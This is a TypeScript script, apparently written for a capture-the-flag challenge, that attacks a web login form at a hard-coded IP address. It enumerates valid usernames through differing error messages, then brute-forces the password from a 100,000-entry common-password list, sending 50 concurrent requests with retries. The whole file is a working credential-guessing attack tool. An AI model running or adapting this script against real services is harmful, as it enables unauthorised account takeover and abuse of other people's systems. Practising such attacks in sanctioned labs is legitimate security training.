import Agent from "agentkeepalive";
import axios from "axios";
import cliProgress from "cli-progress";
import fs from "fs";
import path from "path";
import { URL } from "url";
import util from "util";
import { defer, from } from "rxjs";
import { filter, first, mergeAll, mergeMap, retry, tap } from "rxjs/operators";

const readFile = util.promisify(fs.readFile);

async function main() {
  // Uses HTTP keep alive for faster requests.
  const keepAliveAgent = new Agent({
    freeSocketTimeout: 10_000,
  });

  async function checkAuth(
    username: string,
    password: string,
    baseUrl: string,
    predicate: (data: string) => boolean
  ): Promise<boolean> {
    const { data } = await axios.post(
      urlJoin(baseUrl, "login"),
      `username=${encodeURIComponent(username)}&password=${encodeURIComponent(
        password
      )}`,
      { httpAgent: keepAliveAgent }
    );
    if (typeof data !== "string") {
      throw new Error("response data not a string");
    }
    return predicate(data);
  }

  async function findBatched<T>(
    items: readonly T[],
    predicate: (item: T) => Promise<boolean>
  ): Promise<T | undefined> {
    const progress = new cliProgress.SingleBar(
      { fps: 5, etaBuffer: 200 },
      cliProgress.Presets.shades_classic
    );

    let i = 0;
    progress.start(items.length, i);

    const observables = items.map((item) =>
      defer(async () => {
        if (await predicate(item)) {
          return item;
        }
      }).pipe(retry(3))
    );

    try {
      return await from(observables)
        .pipe(mergeAll(50))
        .pipe(
          tap(() => {
            i += 1;
            progress.update(i);
          })
        )
        .pipe(first((value) => value != null))
        .toPromise();
    } finally {
      progress.stop();
    }
  }

  const baseUrl = "http://35.227.24.107/bcd58a9de3/";

  const usernameCandidates = (
    await readFile(path.join(__dirname, "../lists/usernames.txt"), {
      encoding: "utf-8",
    })
  )
    .split("\n")
    .slice(82222);
  const username = await findBatched(usernameCandidates, (candidate) =>
    checkAuth(
      candidate,
      "",
      baseUrl,
      (data) => !data.includes("Invalid username")
    )
  );

  if (username == null) {
    throw new Error("username not found");
  }
  console.log(`Found username: ${username}`);

  const passwordCandidates = (
    await readFile(
      path.join(__dirname, "../lists/100k-most-used-passwords-NCSC.txt"),
      { encoding: "utf-8" }
    )
  ).split("\n");
  const password = await findBatched(passwordCandidates, (candidate) =>
    checkAuth(
      username,
      candidate,
      baseUrl,
      (data) => !data.includes("Invalid password")
    )
  );

  console.log(`Found password: ${password}`);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});

function urlJoin(baseUrl: string, relative: string): string {
  return new URL(relative, baseUrl).href;
}
